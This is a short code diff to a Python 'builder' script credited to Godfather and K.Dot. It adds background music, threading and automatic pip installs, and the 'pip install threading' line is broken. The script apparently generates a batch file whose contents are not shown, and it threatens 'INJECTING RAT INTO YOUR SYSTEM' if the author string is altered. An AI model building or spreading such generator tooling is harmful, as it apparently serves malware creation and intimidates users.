@@ -32,6 +32,17 @@ try:
 except:
     os.system("pip install bs4")
     from bs4 import BeautifulSoup as bs
+try:
+    from playsound import playsound
+except:
+    os.system("pip install playsound")
+    from playsound import playsound
+
+try:
+    import threading
+except:
+    os.system("pip install threading")
+    import threading
 
 banner = Center.XCenter("""
  ██████╗  ██████╗ ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗███████╗██████╗ 
@@ -40,10 +51,15 @@ banner = Center.XCenter("""
 ██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
 ╚██████╔╝╚██████╔╝██████╔╝██║     ██║  ██║   ██║   ██║  ██║███████╗██║  ██║
  ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
- Made by Godfather and K.Dot#0001\n\n
+ Made by Godfather and K.Dot#0001 (use headphones for best experience)\n\n
 """)
 
 os.system("title BUILDING with K.Dot")
+os.system("cls")
+
+def music():
+    music = os.path.join(os.getcwd(), 'utils\music.mp3')
+    playsound(music)
 
 code = r"""
 @echo off
@@ -220,5 +236,5 @@ if __name__ == '__main__':
     if __author__ != '\x4b\x2e\x44\x6f\x74':
         print(Colors.green + 'INJECTING RAT INTO YOUR SYSTEM')
         os._exit(0)
-    builder()
-    input("press anything to exit...")
+    threading.Thread(target = music).start()
+    threading.Thread(target = builder).start()
